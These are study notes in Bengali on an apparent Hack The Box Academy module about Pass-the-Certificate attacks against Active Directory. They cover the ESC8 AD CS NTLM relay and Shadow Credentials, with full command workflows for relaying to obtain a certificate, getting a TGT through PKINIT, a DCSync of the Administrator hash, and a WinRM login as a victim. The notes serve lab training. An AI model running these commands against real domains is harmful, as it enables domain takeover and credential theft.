# Pass the Certificate - [LINK](https://academy.hackthebox.com/app/module/147/section/1335)


## 1. Pass-the-Certificate কী?

- PKINIT: Kerberos-এর extension, যা initial authentication-এ public-key cryptography ব্যবহার করে।
- Pass-the-Certificate: X.509 certificate ব্যবহার করে Kerberos TGT (Ticket Granting Ticket) নেওয়ার কৌশল।
- প্রধান ব্যবহার: AD CS attacks এবং Shadow Credentials।

## 2. AD CS NTLM Relay — ESC8

ESC8: AD CS-এর HTTP Web Enrollment endpoint-এ NTLM relay attack।

- Web Enrollment সাধারণত `/CertSrv` endpoint-এ থাকে।
- `ntlmrelayx` দিয়ে authentication relay করে certificate নেওয়া যায়।
- `--template`-এ উপযুক্ত certificate template দিতে হয়; `certipy` দিয়ে template enumerate করা যায়।
- Printer Bug দিয়ে কোনো machine account-কে attacker host-এ authentication করতে বাধ্য করা যেতে পারে; target-এ Print Spooler চালু থাকতে হয়।

### Attack workflow

```

# 1. NTLM relay
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# 2. PKINITtools setup
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt

# 3. Certificate থেকে TGT নেওয়া
python3 gettgtpkinit.py -cert-pfx '../krbrelayx/DC01$.pfx' -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

# 4. Ticket ব্যবহার
export KRB5CCNAME=/tmp/dc.ccache

# 5. DCSync — Administrator-এর hash সংগ্রহ
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

```

মনে রাখবে: Certificate থেকে TGT পাওয়ার পর attack-টি Pass-the-Ticket workflow-এ চলে যায়। DC machine account-এর পর্যাপ্ত privilege থাকলে DCSync করা সম্ভব।

## 3. Shadow Credentials

- এটি AD-এর `msDS-KeyCredentialLink` attribute অপব্যবহার করে।
- এই attribute-এ authentication-এর জন্য public key রাখা হয়।
- BloodHound-এর `AddKeyCredentialLink` edge মানে একজন user অন্য user-এর এই attribute পরিবর্তন করতে পারে।
- `pywhisker` দিয়ে certificate তৈরি করে victim-এর attribute-এ public key যোগ করা যায়।

### Attack workflow

```

# 1. Victim-এর attribute-এ key যোগ করা
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'PASSWORD' --target jpinkman --action add

# 2. Generated PFX থেকে TGT নেওয়া
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'PFX_PASSWORD' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# 3. Ticket load করা
export KRB5CCNAME=/tmp/jpinkman.ccache

# 4. Ticket যাচাই
klist

# 5. Kerberos দিয়ে WinRM connection
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

```

গুরুত্বপূর্ণ:

- `pywhisker` একটি `.pfx` certificate ও private key তৈরি করে; output-এ password থাকে।
- `KRB5CCNAME` environment variable Kerberos ticket cache-এর path নির্ধারণ করে।
- `klist` দিয়ে ticket দেখা যায়।
- WinRM access নির্ভর করে victim-এর permission-এর ওপর; উদাহরণে user `Remote Management Users` group-এর সদস্য।

## 4. PKINIT কাজ না করলে

কিছু environment-এ certificate থাকলেও KDC-এর উপযুক্ত EKU support না থাকায় PKINIT authentication ব্যর্থ হতে পারে।

- PassTheCert certificate ব্যবহার করে LDAPS-এ authenticate করতে পারে।
- এটি password পরিবর্তন বা DCSync permission দেওয়ার মতো কাজেও ব্যবহার হতে পারে।
